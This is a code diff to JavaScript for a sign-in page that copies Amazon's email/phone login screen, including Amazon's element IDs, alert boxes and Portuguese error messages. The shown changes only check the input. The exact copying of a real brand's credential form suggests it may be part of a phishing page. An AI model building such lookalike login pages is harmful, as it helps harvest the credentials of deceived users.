@@ -42,17 +42,25 @@
     });
   });
 
-  // ---------- Screen 1: email/mobile (ap_email_login) ----------
-  $("ap_email_login_clear").addEventListener("click", function () {
+  // ---------- Screen 1: literal Amazon claim-collection (ap_login_form) ----------
+  // Amazon shows/hides separate inline alert boxes via the aok-hidden class.
+  var CLAIM_ALERTS = ["empty-claim-alert", "invalid-phone-alert", "invalid-email-alert", "error-alert"];
+  function hideClaimAlerts() {
+    CLAIM_ALERTS.forEach(function (id) { $(id).classList.add("aok-hidden"); });
+  }
+  $("claim-input-clear-button").addEventListener("click", function () {
     $("ap_email_login").value = ""; $("ap_email_login").focus();
-    setError("ap_email_login", "auth-email-missing-alert", "");
+    hideClaimAlerts();
   });
-  $("ap_signin_form").addEventListener("submit", function (e) {
+  $("ap_login_form").addEventListener("submit", function (e) {
     e.preventDefault();
+    hideClaimAlerts();
     var v = $("ap_email_login").value.trim();
-    if (!v) return setError("ap_email_login", "auth-email-missing-alert", "Informe seu celular ou e-mail.");
-    if (!isEmail(v) && !isPhone(v)) return setError("ap_email_login", "auth-email-missing-alert", "Endereço de e-mail ou celular inválido.");
-    setError("ap_email_login", "auth-email-missing-alert", "");
+    if (!v) { $("empty-claim-alert").classList.remove("aok-hidden"); return; }
+    if (!isEmail(v) && !isPhone(v)) {
+      $(v.indexOf("@") > -1 ? "invalid-email-alert" : "invalid-phone-alert").classList.remove("aok-hidden");
+      return;
+    }
     state.login = v;
     $("ap_email_display").textContent = v;
     $("ap_email").value = v;
